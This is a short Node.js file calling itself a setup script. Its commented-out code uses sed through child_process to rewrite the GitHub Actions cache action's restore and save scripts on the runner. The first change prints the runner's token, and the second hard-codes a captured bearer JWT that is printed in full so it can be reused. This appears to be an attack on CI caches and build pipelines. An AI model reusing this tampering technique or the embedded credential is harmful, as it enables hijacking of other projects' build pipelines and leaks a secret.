const cl_process = require("child_process");
const fs = require("fs");

console.log("this is a setup.....")

console.log(__dirname);


// print token
// let writecontent = 'console.log(JSON.stringify(token.split("")));';

//cl_process.exec(`sed -i '3458i ${writecontent}' /home/runner/work/_actions/actions/cache/v2/dist/restore/index.js`, (err, stdout, stderr) => {
//    if (err){
//        console.log(err);
//        return;
//    }
//    console.log(`stdout: ${stdout.toString()}`);
//    console.log(`stderr: ${stderr}`);
//});



// use the printed token
// let writecontent = 'const token = "eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsIng1dCI6Ikh5cTROQVRBanNucUM3bWRydEFoaHJDUjJfUSJ9.eyJuYW1laWQiOiJkZGRkZGRkZC1kZGRkLWRkZGQtZGRkZC1kZGRkZGRkZGRkZGQiLCJzY3AiOiJBY3Rpb25zLkdlbmVyaWNSZWFkOjAwMDAwMDAwLTAwMDAtMDAwMC0wMDAwLTAwMDAwMDAwMDAwMCBBY3Rpb25zLlJlc3VsdHM6YmU5NzY5YWUtZDExOC00NWIxLThmZjItODMyMDU5OGUyMzk4OjJlODQ3MTM3LWFlNzAtNTQxZC1hNDU0LWYxMDA3YWI3ZTNiYiBBY3Rpb25zLlVwbG9hZEFydGlmYWN0czowMDAwMDAwMC0wMDAwLTAwMDAtMDAwMC0wMDAwMDAwMDAwMDAvMTpCdWlsZC9CdWlsZC80IExvY2F0aW9uU2VydmljZS5Db25uZWN0IFJlYWRBbmRVcGRhdGVCdWlsZEJ5VXJpOjAwMDAwMDAwLTAwMDAtMDAwMC0wMDAwLTAwMDAwMDAwMDAwMC8xOkJ1aWxkL0J1aWxkLzQiLCJJZGVudGl0eVR5cGVDbGFpbSI6IlN5c3RlbTpTZXJ2aWNlSWRlbnRpdHkiLCJodHRwOi8vc2NoZW1hcy54bWxzb2FwLm9yZy93cy8yMDA1LzA1L2lkZW50aXR5L2NsYWltcy9zaWQiOiJERERERERERC1ERERELUREREQtRERERC1EREREREREREREREQiLCJodHRwOi8vc2NoZW1hcy5taWNyb3NvZnQuY29tL3dzLzIwMDgvMDYvaWRlbnRpdHkvY2xhaW1zL3ByaW1hcnlzaWQiOiJkZGRkZGRkZC1kZGRkLWRkZGQtZGRkZC1kZGRkZGRkZGRkZGQiLCJhdWkiOiJjNzhiNGI1YS1mZjQ4LTQ0NDUtODBiNC05N2MzNGNlOTc5ZWYiLCJzaWQiOiJhM2IzMGE4MS1kMTcxLTQyNDMtYWY5Yi01ZDM1ODEzYzI2NzYiLCJhYyI6Ilt7XCJTY29wZVwiOlwicmVmcy9oZWFkcy9tYWluXCIsXCJQZXJtaXNzaW9uXCI6M31dIiwiYWNzbCI6IjEwIiwib3JjaGlkIjoiYmU5NzY5YWUtZDExOC00NWIxLThmZjItODMyMDU5OGUyMzk4LnVzZS5fX2RlZmF1bHQiLCJpc3MiOiJ2c3Rva2VuLmFjdGlvbnMuZ2l0aHVidXNlcmNvbnRlbnQuY29tIiwiYXVkIjoidnN0b2tlbi5hY3Rpb25zLmdpdGh1YnVzZXJjb250ZW50LmNvbXx2c286OGNjNmQzYmUtZWIxMi00ZWQxLWEyMmQtODQ4MTA0NDMxM2NhIiwibmJmIjoxNzExMTM1MTcxLCJleHAiOjE3MTExNTc5NzF9.ESm7d2hg_roLUYUb19aghPtVVjT02AUdeZ52Yg8fI1Tvk169qz-UUMcId-E2yjMQ8Z25ifkSgd5Qisx7k6xdFsrfRj1wXhOxVclKcLRKswegaC1lqbJIrIcLa176_UxxRd8Io1FD735tccZslFpnFoOakou2z17dJQVqD5UTz0OVBmwL4zkikvRC1eJthzdxiq6tR1NLycgo_8V3wopRo4Olzr6r0UlZSaOoFHOk0Qp59RF1RLCDXd3A2dm72J50LOVbnPS5BArjxdjfTFnPqj2BFR2-MlaSghCuaVnlhMXBIW2TW3HHBLFSZaqzSs-GjTupc-fzXBRWes85vzcQ9w"';

// cl_process.exec(`sed -i '3457s/.*/${writecontent}/' /home/runner/work/_actions/actions/cache/v2/dist/restore/index.js`, (err, stdout, stderr) => {
//     if (err){
//         console.log(err);
//         return;
//     }
//     console.log(`stdout: ${stdout.toString()}`);
//     console.log(`stderr: ${stderr}`);
// });

 //cl_process.exec(`sed -i '3457s/.*/${writecontent}/' /home/runner/work/_actions/actions/cache/v2/dist/save/index.js`, (err, stdout, stderr) => {
 //    if (err){
 //        console.log(err);
 //        return;
 //    }
 //    console.log(`stdout: ${stdout.toString()}`);
  //   console.log(`stderr: ${stderr}`);
 //});

